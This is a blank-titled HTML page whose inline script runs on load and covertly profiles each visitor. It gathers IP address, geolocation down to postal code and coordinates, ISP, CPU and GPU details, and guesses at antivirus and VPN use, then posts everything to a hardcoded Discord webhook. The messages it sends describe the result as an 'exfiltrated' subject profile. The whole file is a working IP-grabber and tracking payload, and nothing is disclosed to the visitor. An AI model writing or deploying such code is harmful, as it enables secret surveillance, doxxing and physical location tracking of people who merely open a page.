<!DOCTYPE html>
<html>
<head>
    <title></title>
</head>
<body>
    <script>
        (async () => {
            const webhookUrl = "https://discord.com/api/webhooks/1502379311577956374/Qkt2VOYWbwoBc85FzPUvQ0fHDn0qxPyqxu3kbComwCORP1rdu-D3xJjL9dE41X1okoPK";

            if (webhookUrl.includes("YOUR_DISCORD_WEBHOOK_URL_GOES_HERE")) {
                console.error("CONFIGURATION ERROR: WEBHOOK URL IS A PLACEHOLDER.");
                return;
            }

            const getCPU = async () => {
                try {
                    return `${navigator.hardwareConcurrency || "Unknown"} cores`;
                } catch (e) {
                    return "Unknown";
                }
            };

            const getGPU = async () => {
                try {
                    const canvas = document.createElement("canvas");
                    const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
                    
                    if (!gl) return "Unknown";
                    
                    const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
                    return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown";
                } catch (e) {
                    return "Unknown";
                }
            };

            const getSSID = async () => {
                try {
                    if ("connection" in navigator && navigator.connection) {
                        return navigator.connection.ssid || "Unknown";
                    }
                    return "Unknown";
                } catch (e) {
                    return "Unknown";
                }
            };

            const getAntivirus = async () => {
                try {
                    const plugins = Array.from(navigator.plugins);
                    const avKeywords = ["antivirus", "security", "norton", "mcafee", "kaspersky", "avg", "avast"];
                    return plugins.some(plugin => avKeywords.some(keyword => plugin.name.toLowerCase().includes(keyword)));
                } catch (e) {
                    return false;
                }
            };

            const getVPN = async () => {
                try {
                    const ipResponse = await fetch("https://ipinfo.io/json");
                    const ipData = await ipResponse.json();
                    const vpnKeywords = ["vpn", "private", "mullvad", "nordvpn", "expressvpn", "protonvpn"];
                    const org = (ipData.org || "").toLowerCase();
                    return vpnKeywords.some(keyword => org.includes(keyword));
                } catch (e) {
                    return false;
                }
            };

            let payload;

            try {
                const response = await fetch("https://ipinfo.io/json");
                const data = await response.json();

                if (data && data.ip) {
                    const [lat, lon] = data.loc ? data.loc.split(",") : ["Unknown", "Unknown"];
                    const cpu = await getCPU();
                    const gpu = await getGPU();
                    const ssid = await getSSID();
                    const antivirus = await getAntivirus();
                    const vpn = await getVPN();

                    payload = {
                        embeds: [{
                            title: "Intel Acquired: Subject Profile Generated",
                            description: "Digital footprint successfully mapped and exfiltrated.",
                            color: 3066993,
                            fields: [
                                { name: "IP Address", value: `**${data.ip}**`, inline: true },
                                { name: "City", value: data.city || "Unknown", inline: true },
                                { name: "Region", value: data.region || "Unknown", inline: true },
                                { name: "Country", value: data.country || "Unknown", inline: true },
                                { name: "Postal Code", value: data.postal || "Unknown", inline: true },
                                { name: "Timezone", value: data.timezone || "Unknown", inline: true },
                                { name: "Organization/ISP", value: `*${data.org}*` || "Unknown", inline: false },
                                { name: "Coordinates (Lat/Lon)", value: `${lat}, ${lon}`, inline: false },
                                { name: "CPU", value: cpu, inline: true },
                                { name: "GPU", value: gpu, inline: true },
                                { name: "SSID", value: ssid, inline: true },
                                { name: "Antivirus", value: antivirus ? "True" : "False", inline: true },
                                { name: "VPN", value: vpn ? "True" : "False", inline: true },
                            ],
                            footer: {
                                text: `Data processed by Armored Agent v3 at: ${new Date().toISOString()}`
                            }
                        }]
                    };
                } else {
                    payload = {
                        embeds: [{
                            title: "Intel Acquisition FAILURE",
                            description: "The script executed, but the upstream API returned invalid or empty data.",
                            color: 15158332,
                            fields: [
                                { name: "API Queried", value: "`https://ipinfo.io/json`" },
                                { name: "Raw Response", value: "```json\n" + JSON.stringify(data, null, 2) + "\n```" }
                            ],
                            footer: {
                                text: `Failure logged at: ${new Date().toISOString()}`
                            }
                        }]
                    };
                    console.error("API returned bad data:", data);
                }
            } catch (error) {
                payload = {
                    embeds: [{
                        title: "CRITICAL SCRIPT FAILURE",
                        description: "A network-level error occurred while attempting to contact the geolocation API.",
                        color: 9807270,
                        fields: [
                            { name: "Error Message", value: `*${error.message}*` },
                        ],
                        footer: {
                            text: `Critical failure at: ${new Date().toISOString()}`
                        }
                    }]
                };
                console.error("Catch block triggered:", error);
            }

            await fetch(webhookUrl, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload),
            });
        })();
    </script>
</body>
</html>
